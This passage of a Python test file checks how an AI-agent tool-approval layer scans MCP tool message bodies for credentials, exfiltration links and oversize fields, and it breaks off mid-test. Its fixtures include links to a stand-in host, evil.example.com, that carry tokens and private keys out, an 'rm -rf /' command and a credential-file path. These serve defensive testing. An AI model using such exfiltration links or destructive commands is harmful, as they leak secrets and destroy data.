"""A third-party MCP tool's message-body field is scanned as a document.

``security.mcp_body_fields`` names ``(server, tool, field)`` rows: the reviewed
defaults plus rows the dashboard owner allowed. For a call whose server AND tool
identity are trusted, a listed field skips the shell matcher and the deny-rule
list, keeps the size ceiling and the path tier (what main applies to a document
body), and has the 256 KiB ceiling instead of 20 KiB. A credential, or a link
that carries one, refuses a body over 20 KiB; every other match, and any match
in a shorter body, is logged as a warning. Everything else
keeps the full scan, and a field refused for size names the tool and field and
is remembered for the owner's allow button.
"""

from __future__ import annotations

import base64
import errno
import hashlib
import json
import logging
from unittest.mock import MagicMock, patch
from urllib.parse import urlencode

import pytest

import kiro_crew.llm_helpers as llm_helpers
import kiro_crew.sel as sel_mod
from kiro_crew.llm_helpers import (
    _MAX_SCANNABLE_TOOL_INPUT_CHARS,
    ToolApprovalPolicy,
    _resolve_permission,
)
from kiro_crew.providers.base import EVENT_PERMISSION_REQUEST, LLMEvent
from kiro_crew.security import mcp_body_fields as mbf
from kiro_crew.security.redaction_structured import compat
from kiro_crew.testing.synthetic_credentials import github_classic

_SERVER = "gmail"
_TOOL = "send_email"
_HTML_ROW = '<tr><td style="padding:4px">Quarterly item</td><td>Status: on track</td></tr>\n'
#: Split so the repository's content scan does not read a fixture as a key.
_PEM_BEGIN = "-----BEGIN RSA " "PRIVATE KEY-----"
_PEM_END = "-----END RSA " "PRIVATE KEY-----"
#: Deterministic high-entropy bytes, the shape of an image payload or a signature.
_NOISE = b"".join(hashlib.sha256(str(i).encode()).digest() for i in range(96))
_PRESIGNED = (
    "https://bkt.s3.us-east-1.amazonaws.com/logo.png?X-Amz-Algorithm=AWS4-HMAC-SHA256"
    "&X-Amz-Credential=AKIAIOSFODNN7EXAMPLE%2F20261116%2Fus-east-1%2Fs3%2Faws4_request"
    "&X-Amz-Date=20261116T000000Z&X-Amz-Expires=3600&X-Amz-SignedHeaders=host"
    "&X-Amz-Signature=" + "ab12cd34ef56" * 5 + "ab12"
)
_JWT = (
    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyQGV4YW1wbGUuY29tIiwibGlzdCI6Im5ld3MifQ"
    ".SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
)
#: Ordinary content of a forwarded or newsletter mail, none of it a secret anyone
#: put there. Each trips the exfiltration check or a generic credential kind (an
#: entropy guess, a signature pattern, a JWT), and main sends each one.
_ORDINARY_CONTENT = {
    "mail-safe-link": '<a href="https://nam12.safelinks.protection.outlook.com/?url=https%3A%2F%2F'
    "www.example.com%2Fnews%2F2026%2Fquarterly-update%3Futm_source%3Dnewsletter"
    "&amp;data=05%7C02%7Cteam%40example.com%7C3f2a9c1e4b7d4e8fa1c2d3e4f5a6b7c8"
    "%7C72f988bf86f141af91ab2d7cd011db47%7C1%7C0%7C638671234567890123%7CUnknown"
    "%7CTWFpbGZsb3d8eyJWIjoiMC4wLjAwMDAifQ%3D%3D%7C0%7C%7C%7C"
    '&amp;sdata=Zx9k2LmQ7pR4sT1uV8wY3aB6cD0eF5gH2iJ9kL4mN7o%3D&amp;reserved=0">news</a>',
    "click-tracking": '<a href="https://click.example-mail.com/ls/click?upn=u001.'
    + "&amp;".join(
        f"utm_{k}=quarterly-update-newsletter-{k}-2026"
        for k in ("source", "medium", "campaign", "content", "term", "id")
    )
    + '">read</a>',
    "sendgrid-click": '<a href="https://u1.ct.sendgrid.net/ls/click?upn=u001.'
    + base64.urlsafe_b64encode(_NOISE[:90]).decode()
    + '">read</a>',
    "presigned-image": f'<img src="{_PRESIGNED}">',
    "presigned-image-html-escaped": f'<img src="{_PRESIGNED.replace("&", "&amp;")}">',
    "presigned-sdk-v3": '<a href="'
    + _PRESIGNED.replace("AKIA", "ASIA")
    + '&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&x-id=GetObject">file</a>',
    "sharing-link": '<a href="https://contoso.sharepoint.com/:w:/s/team/'
    'EZx1aB2cD3eF4gH5iJ6kL7MBn8oP9qR0sT1uV2wX3yZ4aB?e=Ab1Cd2">doc</a>',
    "jwt-unsubscribe": '<a href="https://example.substack.com/action/disable_email?token='
    + _JWT
    + '">unsubscribe</a>',
    "wrapped-inline-image": '<img src="data:image/png;base64,'
    + base64.encodebytes(_NOISE).decode()
    + '">',
    "pgp-signature": "<pre>-----BEGIN PGP SIGNATURE-----\n\n"
    + base64.encodebytes(_NOISE[:288]).decode()
    + "=Ab3x\n-----END PGP SIGNATURE-----</pre>",
    "dkim-header": "<pre>DKIM-Signature: v=1; a=rsa-sha256; d=example.com; s=s1; "
    "bh=47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=; b="
    + base64.b64encode(_NOISE[:192]).decode()
    + "</pre>",
    "password-param-link": '<a href="https://example.com/reset?password=Zq8vT3kLp9WmX2rB7nYc4HsJ6fGdQ1aE">'
    "reset</a>",
    "bare-key-in-text": "<p>Use this key: Kx3Q51tPusV/D0URlGfMmNbVc7Z8yJhLpQrStUwZ</p>",
    "generic-bearer-header": "<pre>Authorization: Bearer abcdefghijklmnop1234567890</pre>",
    "generic-userinfo-link": '<a href="https://user:hunter2pass@example.com/">site</a>',
    "search-link-naming-a-label": '<a href="https://www.google.com/search?q=aws_secret_access_key'
    '+%3D+what+is+it">search</a>',
    "aws-arn-long-name": "<p>Queue arn:aws:sqs:us-east-1:123456789012:"
    "order-processing-dead-letter-queue-prod</p>",
    "pypi-word": "<p>Job pypi-publish-release-artifacts failed</p>",
    "sendgrid-word": "<p>Contact SG.Engineering-Department-Office.Singapore-Branch-Team</p>",
    # Split so the repository's push protection does not read the literal as a key.
    "stripe-docs-test-key": "<p>Try it with sk_" + "test_4eC39HqLyjWDarjtT1zdp7dc</p>",
    "already-redacted-key-block": f"<pre>{_PEM_BEGIN}\n[REDACTED: credential]\n{_PEM_END}</pre>",
    "key-header-named-in-prose": "<p>Your key file must start with "
    + _PEM_BEGIN.replace("RSA", "OPENSSH")
    + " and nothing else.</p>",
    "pypi-slug-link": '<a href="https://realpython.com/pypi-publish-python-package/">guide</a>',
    "openai-word": "<p>see our sk-proj-management-dashboard-overview page</p>",
    "gitlab-word": "<p>glpat-rotation-policy-update notes</p>",
    "slack-placeholder": "<pre>SLACK_BOT_TOKEN=xoxb-your-bot-token-here</pre>",
    "anthropic-placeholder-after-bearer": "<pre>Authorization: Bearer sk-ant-api03-your-key-goes-here</pre>",
    "session-token-word": "<p>error: SessionToken: expired, retry</p>",
    "key-markers-named-in-prose": "<p>The file starts with "
    + _PEM_BEGIN
    + " and ends with "
    + _PEM_END
    + ".</p>",
    "key-block-with-placeholder-body": f"<pre>{_PEM_BEGIN}\n...\n{_PEM_END}</pre>",
    "labelled-aws-secret-expression": "<pre>aws_secret_access_key=get_secret()</pre>",
    "key-header-then-a-word": f"<pre>{_PEM_BEGIN}\nThanks\n</pre>",
    "search-link-quoting-a-key-header": '<a href="https://www.google.com/search?q='
    '%2D%2D%2D%2D%2DBEGIN%20RSA%20PRIVATE%20KEY%2D%2D%2D%2D%2D">search</a>',
    # A literal ``+`` in a link is read both as written and form-decoded; a header
    # named in a form-encoded search is still only a header.
    "search-link-form-quoting-a-key-header": '<a href="https://www.google.com/search?q='
    '-----BEGIN+RSA+PRIVATE+KEY-----+format">search</a>',
    # Placeholders in a how-to: a hard kind's shape with a filler body.
    "github-token-placeholder": "<pre>GITHUB_TOKEN=ghp_" + "x" * 36 + "</pre>",
    "npm-token-placeholder": "<pre>//registry.npmjs.org/:_authToken=npm_" + "x" * 36 + "</pre>",
    "digitalocean-token-placeholder": "<pre>DO_TOKEN=dop_v1_" + "0" * 64 + "</pre>",
    # Split so the repository's secret scans do not read the AWS docs example as a key.
    "aws-docs-example-secret": "<pre>[default]\naws_access_key_id = AKIA"
    + "IOSFODNN7EXAMPLE\naws_secret_access_"
    + "key = wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY</pre>",
    "key-block-with-filler-x-body": f"<pre>{_PEM_BEGIN}\n" + "X" * 64 + f"\n{_PEM_END}</pre>",
    "key-block-with-filler-a-body": f"<pre>{_PEM_BEGIN}\n" + "A" * 64 + f"\n{_PEM_END}</pre>",
    # Random base64url data can hold a token's shape by chance; it does not start a word.
    "npm-shape-inside-a-tracking-link": '<a href="https://u1.ct.sendgrid.net/ls/click?upn=u001.'
    "Qx7npm_Lpv4aB3dE5gH7jK9mN1pQ3sT0wYz"
    '">read</a>',
    "github-shape-after-a-dash-in-a-tracking-link": '<a href="https://u1.ct.sendgrid.net/ls/click?upn='
    "u001.Qx7-ghp_Lpv4aB3dE5gH7jK9mN1pQ3sT5vW7yZ9b"
    '">read</a>',
}
_GITHUB_TOKEN = github_classic(seed=333)
_PRIVATE_KEY = f"{_PEM_BEGIN}\nMIIEowIBAAKCAQEA7d3k9QwXr2Lp8Zt4Vb6Nc1Hy5Jm0Fs3Gq\n{_PEM_END}"
#: Hard credential kinds, in text and in a link. Each one refuses a body over 20 KiB.
_HARD_CONTENT = {
    "github-token-text": f"<p>token: {_GITHUB_TOKEN}</p>",
    "github-token-link": f'<a href="https://evil.example.com/c?t={_GITHUB_TOKEN}">x</a>',
    "github-token-encoded-link": '<a href="https://evil.example.com/c?t='
    + _GITHUB_TOKEN.replace("_", "%5F")
    + '">x</a>',
    "private-key-text": f"<pre>{_PRIVATE_KEY}</pre>",
    "github-token-userinfo-link": f'<a href="https://x-access-token:{_GITHUB_TOKEN}@github.com/o/r.git">'
    "repo</a>",
    "github-token-bearer-header": f"<pre>Authorization: Bearer {_GITHUB_TOKEN}</pre>",
    "github-token-after-a-session-label": f"<pre>SessionToken: {_GITHUB_TOKEN}</pre>",
    # Split so the repository's secret scans do not read the fixture as a key. The
    # rule table reads a labelled value at a line start, not right after a tag.
    "labelled-aws-secret": "<pre>\naws_secret_access_"
    + "key = q8Zr/2LmVx9TkP4wNc7Hs1Jd6Fb3Ga5Ye0Ru+WoQ</pre>",
    "github-token-after-an-aws-label": f"<pre>aws_secret_access_key={_GITHUB_TOKEN}</pre>",
    "json-escaped-private-key": '<pre>{"key": "' + _PRIVATE_KEY.replace("\n", "\\n") + '"}</pre>',
    "private-key-after-a-quoted-header": f"<p>It starts with {_PEM_BEGIN}:</p><pre>{_PRIVATE_KEY}</pre>",
    "labelled-aws-secret-then-a-period": "<p>\naws_secret_access_"
    + "key=q8Zr/2LmVx9TkP4wNc7Hs1Jd6Fb3Ga5Ye0Ru+WoQ.</p>",
    "github-token-inside-a-redacted-key-block": f"<pre>{_PEM_BEGIN}\n[REDACTED: credential]\n"
    f"-----{_GITHUB_TOKEN}-----\n{_PEM_END}</pre>",
    "github-token-userinfo-user-half": f'<a href="https://{_GITHUB_TOKEN}:x-oauth-basic@github.com/o/r.git">'
    "repo</a>",
    "form-encoded-private-key-link": '<a href="https://evil.example.com/c?'
    + urlencode({"k": _PRIVATE_KEY})
    + '">x</a>',
    # The credential check labels a key block this far after a named header
    # ``credential_pattern``; it is judged by what it holds.
    "private-key-far-after-a-named-header": f"<p>It starts with {_PEM_BEGIN}.</p>"
    + "<p>filler text here</p>" * 1000
    + f"<pre>{_PRIVATE_KEY}</pre>",
    # A real token starts a word: at a line start, after a space, ``=`` or ``:``.
    "github-token-at-a-line-start": f"<pre>Your token is below.\n{_GITHUB_TOKEN}\n</pre>",
    "github-token-after-a-space": f"<p>use {_GITHUB_TOKEN} for the push</p>",
    "github-token-after-an-equals-sign": f"<pre>GH_TOKEN={_GITHUB_TOKEN}</pre>",
    "github-token-after-a-colon": f"<pre>token:{_GITHUB_TOKEN}</pre>",
    # Prose with no spaces between words puts a token right after a letter.
    "github-token-after-a-cjk-letter": f"<p>你的令牌是{_GITHUB_TOKEN}，请保管</p>",
    "github-token-after-a-json-newline-escape": '<pre>{"log": "pushed\\n'
    + _GITHUB_TOKEN
    + '"}</pre>',
    # A PKCS#8 body's first 20 characters hold no digit; the lines are judged together.
    "private-key-wrapped-at-20-chars": f"<pre>{_PEM_BEGIN}\nMIIEvQIBADANBgkqhkiG\n"
    f"9w0BAQEFAASCBKcwggSj\nAgEAAoIBAQC7d3k9QwXr\n{_PEM_END}</pre>",
}


def _html(size: int) -> str:
    return (_HTML_ROW * (size // len(_HTML_ROW) + 1))[:size]


@pytest.fixture(autouse=True)
def _home(tmp_path, _floor_monkeypatch):
    _floor_monkeypatch.setenv("KIROCREW_HOME", str(tmp_path))
    _floor_monkeypatch.setattr(mbf, "store_path", lambda: tmp_path / "mcp_body_fields.json")
    with mbf._REFUSALS_LOCK:
        mbf._REFUSALS.clear()
    yield
    with mbf._REFUSALS_LOCK:
        mbf._REFUSALS.clear()


class _Provider:
    def __init__(self) -> None:
        self.approved: list[str] = []
        self.rejected: list[str] = []

    async def approve_tool(self, request_id: str) -> None:
        self.approved.append(request_id)

    async def reject_tool(self, request_id: str) -> None:
        self.rejected.append(request_id)


def _event(
    params: dict, *, server: str = _SERVER, tool: str = _TOOL, identity: bool = True
) -> LLMEvent:
    return LLMEvent(
        kind=EVENT_PERMISSION_REQUEST,
        title=f"@{server}/{tool}",
        request_id="r1",
        tool_kind="other",
        tool_input=json.dumps(params),
        raw_tool_params=params,
        raw_params_trusted=True,
        shell_classified=True,
        is_shell=False,
        mcp_identity_trusted=identity,
        mcp_server_name=server,
        tool_name=tool,
    )


async def _resolve(event: LLMEvent) -> tuple[bool, str]:
    rows: list[dict] = []
    sel_stub = MagicMock()
    sel_stub.log_tool_invocation.side_effect = lambda **kw: rows.append(kw)
    with patch.object(sel_mod, "sel", lambda: sel_stub):
        approved = await _resolve_permission(
            _Provider(), event, ToolApprovalPolicy.AUTO_APPROVE, None  # type: ignore[arg-type]
        )
    return approved, " ".join(str(r.get("error") or "") for r in rows)


def _mail(body: str, **extra: str) -> dict:
    return {"to": "team@example.com", "subject": "Weekly report", "body": body, **extra}


def _codex_envelope(arguments: dict, *, server: str = _SERVER, tool: str = _TOOL) -> dict:
    return {"server": server, "tool": tool, "arguments": arguments}


@pytest.fixture
def warnings(caplog):
    """The warnings ``mcp_body_fields`` logged during the test."""
    caplog.set_level(logging.WARNING, logger=mbf.__name__)
    return lambda: [
        r.getMessage()
        for r in caplog.records
        if r.name == mbf.__name__ and r.levelno == logging.WARNING
    ]


async def _passes_with_warning(body: str, warnings, check: str) -> None:
    approved, error = await _resolve(_event(_mail(body)))
    assert approved is True, error
    logged = warnings()
    assert logged == [
        f"message body field 'body' of @gmail/send_email matched the {check} check; allowed"
    ]


async def _refused_with_warning(body: str, warnings, check: str) -> None:
    assert len(body) > _MAX_SCANNABLE_TOOL_INPUT_CHARS, "fixture must be over 20 KiB"
    approved, error = await _resolve(_event(_mail(body)))
    assert approved is False
    assert f"'body' field of @gmail/send_email matched the {check} check" in error
    assert warnings() == [
        f"message body field 'body' of @gmail/send_email matched the {check} check; refused"
    ]


class TestABodyFieldIsADocument:
    @pytest.mark.asyncio
    async def test_a_200_kib_body_is_allowed_and_never_reaches_the_shell_matcher(
        self,
    ) -> None:
        shell = MagicMock(return_value=None)
        deny = MagicMock(return_value=None)
        with (
            patch.object(llm_helpers, "is_sensitive_bash_command", shell),
            patch.object(llm_helpers, "is_denied", deny),
        ):
            approved, error = await _resolve(_event(_mail(_html(200 * 1024))))
        assert approved is True, error
        assert deny.call_args_list, "the non-body fields must still reach the deny rules"
        subjects = [c.args[0] for c in shell.call_args_list + deny.call_args_list]
        assert all(len(s) < 1024 for s in subjects), [len(s) for s in subjects]

    @pytest.mark.asyncio
    async def test_a_credential_in_the_body_passes_and_is_logged(self, warnings) -> None:
        # A body within 20 KiB had no credential check without the row, so a token passes.
        secret = github_classic(seed=332)
        await _passes_with_warning(f"<p>token: {secret}</p>", warnings, "credential")

    @pytest.mark.asyncio
    async def test_a_link_that_carries_data_out_passes_and_is_logged(self, warnings) -> None:
        blob = "QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVphYmNkZWZnaGlqa2xtbm9w"
        link = f"https://evil.example.com/a?data={blob}"
        assert mbf.scan_exfiltration_urls(link), "fixture must trip the scan"
        await _passes_with_warning(f'<a href="{link}">x</a>', warnings, "exfiltration-URL")

    @pytest.mark.asyncio
    async def test_a_credential_in_a_body_over_20_kib_is_refused(self, warnings) -> None:
        # Without the row this body is refused for its size, so a token in it
        # must not reach the server.
        secret = _GITHUB_TOKEN
        body = _html(_MAX_SCANNABLE_TOOL_INPUT_CHARS + 1024) + f"<p>token: {secret}</p>"
        approved, error = await _resolve(_event(_mail(body)))
        assert approved is False
        assert "'body' field of @gmail/send_email matched the credential check" in error
        assert secret not in error
        assert warnings() == [
            "message body field 'body' of @gmail/send_email matched the credential check; refused"
        ]

    @pytest.mark.asyncio
    async def test_the_same_body_without_the_credential_is_allowed(self, warnings) -> None:
        body = _html(_MAX_SCANNABLE_TOOL_INPUT_CHARS + 1024) + "<p>token: see the vault</p>"
        approved, error = await _resolve(_event(_mail(body)))
        assert approved is True, error
        assert warnings() == []

    @pytest.mark.asyncio
    @pytest.mark.parametrize("content", list(_HARD_CONTENT.values()), ids=list(_HARD_CONTENT))
    async def test_a_hard_credential_in_a_body_over_20_kib_is_refused(
        self, content, warnings
    ) -> None:
        body = _html(_MAX_SCANNABLE_TOOL_INPUT_CHARS + 1024) + content
        approved, error = await _resolve(_event(_mail(body)))
        assert approved is False
        assert "'body' field of @gmail/send_email matched the credential check" in error
        assert _GITHUB_TOKEN[4:] not in error and "MIIEow" not in error
        assert warnings() == [
            "message body field 'body' of @gmail/send_email matched the credential check; refused"
        ]

    @pytest.mark.asyncio
    @pytest.mark.parametrize(
        "content", list(_ORDINARY_CONTENT.values()), ids=list(_ORDINARY_CONTENT)
    )
    async def test_ordinary_content_in_a_body_over_20_kib_is_allowed(
        self, content, warnings
    ) -> None:
        # Main sends these; over 20 KiB a hit on them is logged, not refused. The
        # rule table reads no credential or link in some of them at all.
        body = _html(_MAX_SCANNABLE_TOOL_INPUT_CHARS + 1024) + content
        approved, error = await _resolve(_event(_mail(body)))
        assert approved is True, error
        logged = warnings()
        assert all(w.endswith("; allowed") for w in logged), logged

    @pytest.mark.asyncio
    async def test_a_hard_credential_beside_ordinary_content_is_still_refused(
        self, warnings
    ) -> None:
        body = (
            _html(_MAX_SCANNABLE_TOOL_INPUT_CHARS + 1024)
            + "".join(_ORDINARY_CONTENT.values())
            + _HARD_CONTENT["github-token-text"]
        )
        await _refused_with_warning(body, warnings, "credential")

    def test_every_hard_kind_is_a_rule_the_credential_check_names(self) -> None:
        # A renamed rule id would silently stop refusing.
        assert mbf._HARD_CREDENTIAL_RULES <= set(compat._OLD_RULE.values())

    @pytest.mark.asyncio
    @pytest.mark.parametrize(
        ("extra", "approved_expected"),
        [(0, True), (1, False)],
        ids=["at-the-limit-allowed", "one-over-refused"],
    )
    async def test_the_refusal_starts_one_char_over_the_command_limit(
        self, extra, approved_expected, warnings
    ) -> None:
        secret_text = f"<p>token: {_GITHUB_TOKEN}</p>"
        size = _MAX_SCANNABLE_TOOL_INPUT_CHARS + extra
        body = secret_text + _html(size - len(secret_text))
        assert len(body) == size
        approved, error = await _resolve(_event(_mail(body)))
        assert approved is approved_expected, error
        verdict = "allowed" if approved_expected else "refused"
        assert warnings() == [
            f"message body field 'body' of @gmail/send_email matched the credential check; {verdict}"
        ]

    @pytest.mark.asyncio
    async def test_a_credential_in_a_field_that_is_not_a_body_is_unchanged(self, warnings) -> None:
        # ``subject`` keeps the full command scan, which has no credential check.
        secret = _GITHUB_TOKEN
        approved, error = await _resolve(_event({**_mail("hello"), "subject": secret}))
        assert approved is True, error
        assert warnings() == []

    @pytest.mark.asyncio
    async def test_a_credential_path_in_the_body_is_refused(self) -> None:
        # The path tier judges a string that IS a path, as for the Kiro Crew rows.
        approved, error = await _resolve(_event(_mail("~/.aws/credentials")))
        assert approved is False
        assert "sensitive path" in error

    @pytest.mark.asyncio
    async def test_a_body_over_256_kib_is_refused(self) -> None:
        from kiro_crew.security import MAX_SCANNABLE_SOURCE_BODY_CHARS as limit

        approved, error = await _resolve(_event(_mail(_html(limit + 1))))
        assert approved is False
        assert f"> {limit} limit" in error

    @pytest.mark.asyncio
    async def test_the_body_is_judged_by_the_one_document_body_scan(self) -> None:
        # The same scan as a Kiro Crew document body: ``_first_tool_input_denial``
        # with ``command_rules=False``, never a second scanner.
        seen: list[tuple[list[str], bool]] = []
        real = llm_helpers._first_tool_input_denial

        def _spy(strings, denied, **kwargs):
            seen.append((list(strings), kwargs.get("command_rules", True)))
            return real(strings, denied, **kwargs)

        body = _html(40 * 1024)
        with patch.object(llm_helpers, "_first_tool_input_denial", side_effect=_spy):
            approved, error = await _resolve(_event(_mail(body)))
        assert approved is True, error
        assert ([body], False) in seen
        assert all(body not in strings for strings, rules in seen if rules)


class TestACodexMcpEnvelope:
    @pytest.mark.asyncio
    async def test_a_listed_body_field_uses_the_document_ceiling(self) -> None:
        body = _html(52 * 1024)
        approved, error = await _resolve(_event(_codex_envelope(_mail(body))))
        assert approved is True, error

    @pytest.mark.asyncio
    async def test_an_unlisted_field_names_the_field_and_records_the_row(self) -> None:
        html = _html(52 * 1024)
        approved, error = await _resolve(
            _event(_codex_envelope({"to": "a@example.com", "html": html}))
        )
        assert approved is False
        assert "'html' field of @gmail/send_email" in error
        assert [(r["server"], r["tool"], r["field"]) for r in mbf.size_refusals()] == [
            (_SERVER, _TOOL, "html")
        ]

    @pytest.mark.asyncio
    @pytest.mark.parametrize(
        ("envelope_server", "envelope_tool"),
        [("other-mail", _TOOL), (_SERVER, "other-tool")],
    )
    async def test_a_mismatched_envelope_keeps_the_command_scan(
        self, envelope_server, envelope_tool
    ) -> None:
        body = _html(52 * 1024)
        approved, error = await _resolve(
            _event(_codex_envelope(_mail(body), server=envelope_server, tool=envelope_tool))
        )
        assert approved is False
        assert f"> {_MAX_SCANNABLE_TOOL_INPUT_CHARS} limit" in error
        assert mbf.size_refusals() == []


class TestEverythingElseKeepsTheFullScan:
    @pytest.mark.asyncio
    async def test_an_untrusted_server_with_the_same_names_keeps_the_20_kib_refusal(
        self,
    ) -> None:
        body = _html(_MAX_SCANNABLE_TOOL_INPUT_CHARS + 1)
        approved, error = await _resolve(_event(_mail(body), server="other-mail"))
        assert approved is False
        assert f"> {_MAX_SCANNABLE_TOOL_INPUT_CHARS} limit" in error

    @pytest.mark.asyncio
    async def test_an_untrusted_identity_keeps_the_20_kib_refusal(self) -> None:
        body = _html(_MAX_SCANNABLE_TOOL_INPUT_CHARS + 1)
        approved, error = await _resolve(_event(_mail(body), identity=False))
        assert approved is False
        assert "too large" in error
        assert mbf.size_refusals() == []

    @pytest.mark.asyncio
    async def test_a_non_body_field_is_still_size_capped(self) -> None:
        subject = "s" * (_MAX_SCANNABLE_TOOL_INPUT_CHARS + 1)
        approved, error = await _resolve(_event(_mail("<p>hi</p>", subject=subject)))
        assert approved is False
        assert "'subject' field of @gmail/send_email" in error

    @pytest.mark.asyncio
    async def test_a_non_body_field_is_still_command_scanned(self) -> None:
        approved, _error = await _resolve(_event(_mail("<p>hi</p>", subject="rm -rf /")))
        assert approved is False


class TestTheSizeRefusalIsNamedAndOffered:
    @pytest.mark.asyncio
    async def test_an_unlisted_field_names_the_tool_and_field_and_is_recorded(self) -> None:
        body = _html(_MAX_SCANNABLE_TOOL_INPUT_CHARS + 1)
        approved, error = await _resolve(_event({"to": "a@example.com", "html": body}))
        assert approved is False
        assert "'html' field of @gmail/send_email" in error
        assert "Settings > Security" in error
        assert [(r["server"], r["tool"], r["field"]) for r in mbf.size_refusals()] == [
            (_SERVER, _TOOL, "html")
        ]

    @pytest.mark.asyncio
    @pytest.mark.parametrize(
        "field",
        ["command", "cmd", "script", "sql", "query", "code", "args", "sql_query", "shellCommand"],
    )
    async def test_an_executable_field_is_never_offered(self, field) -> None:
        body = _html(_MAX_SCANNABLE_TOOL_INPUT_CHARS + 1)
        approved, error = await _resolve(_event({"to": "a@example.com", field: body}))
        assert approved is False
        assert "Settings > Security" not in error
        assert mbf.size_refusals() == []

    def test_a_stored_executable_row_is_dropped_on_read(self, tmp_path) -> None:
        rows = [
            {"server": "mail", "tool": "send", "field": "script"},
            {"server": "mail", "tool": "send", "field": "html"},
        ]
        (tmp_path / "mcp_body_fields.json").write_text(json.dumps({"fields": rows}))
        assert [r["field"] for r in mbf.owner_rows()] == ["html"]

    @pytest.mark.parametrize("field", ["body", "html", "text", "content", "markdown", "subject"])
    def test_a_body_field_name_is_not_executable(self, field) -> None:
        assert mbf.is_executable_field(field) is False

    @pytest.mark.parametrize(
        "field",
        [
            "commands",
            "Commands",
            "cmds",
            "cmdline",
            "commandline",
            "scripts",
            "queries",
            "statements",
            "expressions",
            "run_bash",
            "runBash",
            "exec_sh",
            "zsh",
            "powershell_script",
            "pwsh",
        ],
    )
    def test_a_plural_or_shell_name_is_executable(self, field) -> None:
        assert mbf.is_executable_field(field) is True

    @pytest.mark.parametrize(
        "field",
        [
            "commandment",
            "scripture",
            "shellfish",
            "bashful",
            "queryable_text",
            "html_body",
            "contents",
            "message",
            "description",
            "summary",
            "template",
            "payload",
        ],
    )
    def test_exact_words_only_so_a_longer_word_stays_allowed(self, field) -> None:
        assert mbf.is_executable_field(field) is False

    def test_command_id_keeps_its_verdict_from_before(self) -> None:
        # ``command`` was already listed, so ``command_id`` was refused before this
        # list grew; the new words neither add nor lift that refusal.
        assert mbf.is_executable_field("command_id") is True
        assert set(mbf._field_words("command_id")) & mbf._EXECUTABLE_WORDS == {"command"}

    def test_a_stored_row_with_a_newly_listed_word_is_dropped_with_one_warning(
        self, tmp_path, caplog, monkeypatch
    ) -> None:
        monkeypatch.setattr(mbf, "_warned_dropped", set())
        rows = [
            {"server": "mail", "tool": "send", "field": "scripts"},
            {"server": "mail", "tool": "send", "field": "html"},
        ]
        (tmp_path / "mcp_body_fields.json").write_text(json.dumps({"fields": rows}))
        with caplog.at_level(logging.WARNING, logger=mbf.__name__):
            assert [r["field"] for r in mbf.owner_rows()] == ["html"]
            assert [r["field"] for r in mbf.owner_rows()] == ["html"]
        dropped = [r for r in caplog.records if "'scripts'" in r.getMessage()]
        assert len(dropped) == 1

    def test_the_drop_warning_keeps_a_tool_name_on_one_line(
        self, tmp_path, caplog, monkeypatch
    ) -> None:
        monkeypatch.setattr(mbf, "_warned_dropped", set())
        rows = [{"server": "mail", "tool": "send\nforged line", "field": "scripts"}]
        (tmp_path / "mcp_body_fields.json").write_text(json.dumps({"fields": rows}))
        with caplog.at_level(logging.WARNING, logger=mbf.__name__):
            assert mbf.owner_rows() == []
        (record,) = [r for r in caplog.records if "'scripts'" in r.getMessage()]
        assert "\n" not in record.getMessage()

    @pytest.mark.asyncio
    async def test_an_allowed_body_before_an_oversize_field_names_the_oversize_one(self) -> None:
        # ``body`` is a default row for gmail/send_email; ``html`` is not listed.
        big = _html(_MAX_SCANNABLE_TOOL_INPUT_CHARS + 1)
        approved, error = await _resolve(_event({"body": big, "html": big}))
        assert approved is False
        assert "'html' field of @gmail/send_email" in error
        assert [r["field"] for r in mbf.size_refusals()] == ["html"]

    @pytest.mark.asyncio
    async def test_the_size_refusal_links_to_the_settings_section(self) -> None:
        from kiro_crew.llm_helpers_parts import tool_approval

        body = _html(_MAX_SCANNABLE_TOOL_INPUT_CHARS + 1)
        with patch.object(
            tool_approval, "_body_field_link_origin", return_value="https://crew.example.com"
        ):
            approved, error = await _resolve(_event({"to": "a@example.com", "html": body}))
        assert approved is False
        assert "'html' field of @gmail/send_email" in error
        assert (
            "Settings > Security > Message body fields "
            "(https://crew.example.com/settings/security/bodyFields)"
        ) in error
        assert "token=" not in error
        assert "kirocrew " not in error

    def test_without_a_dashboard_origin_the_refusal_names_the_section_only(self) -> None:
        reason = mbf.size_refusal_reason("mail", "send", "html", 30000, 20480)
        assert "'html' field of @mail/send" in reason
        assert reason.endswith("under Settings > Security > Message body fields")
        assert "http" not in reason

    def test_the_link_origin_follows_the_dashboard_url(self, monkeypatch) -> None:
        from types import SimpleNamespace

        from kiro_crew.config import loader
        from kiro_crew.llm_helpers_parts import tool_approval

        cfg = SimpleNamespace(
            dashboard=SimpleNamespace(url="http://127.0.0.1:8765/"),
            slack=SimpleNamespace(use_tunnel_url=False),
        )
        monkeypatch.setattr(loader.KiroCrewConfig, "load", classmethod(lambda cls: cfg))
        assert tool_approval._body_field_link_origin() == "http://127.0.0.1:8765"
        monkeypatch.setattr(
            loader.KiroCrewConfig, "load", classmethod(lambda cls: (_ for _ in ()).throw(OSError))
        )
        assert tool_approval._body_field_link_origin() == ""

    @pytest.mark.asyncio
    async def test_an_owner_row_lets_the_field_through(self) -> None:
        body = _html(60 * 1024)
        params = {"to": "a@example.com", "html": body}
        approved, _ = await _resolve(_event(params, server="mail", tool="mail___send"))
        assert approved is False
        mbf.add_owner_row(mbf.BodyField("mail", "send", "html"))
        assert mbf.size_refusals() == []
        approved, error = await _resolve(_event(params, server="mail", tool="mail___send"))
        assert approved is True, error
        assert mbf.remove_owner_row(mbf.BodyField("mail", "send", "html")) is True
        approved, _ = await _resolve(_event(params, server="mail", tool="mail___send"))
        assert approved is False


class TestKiroCrewsOwnServersGetNoRow:
    """A ``kirocrew-*`` server's arguments keep Kiro Crew's own rules, never a body row."""

    @pytest.mark.asyncio
    @pytest.mark.parametrize(
        ("server", "tool", "params"),
        [
            # A script job reads ``message`` as its arguments, so the cron carve-out
            # gives it no document exemption and it must keep the command scan.
            ("kirocrew-cron", "cron_add", {"script": "job.py:run", "message": "m"}),
            ("kirocrew-core", "artifact_save", {"type": "webapp", "content": "c"}),
        ],
    )
    async def test_an_oversize_field_is_refused_and_not_offered(self, server, tool, params) -> None:
        field = "message" if "message" in params else "content"
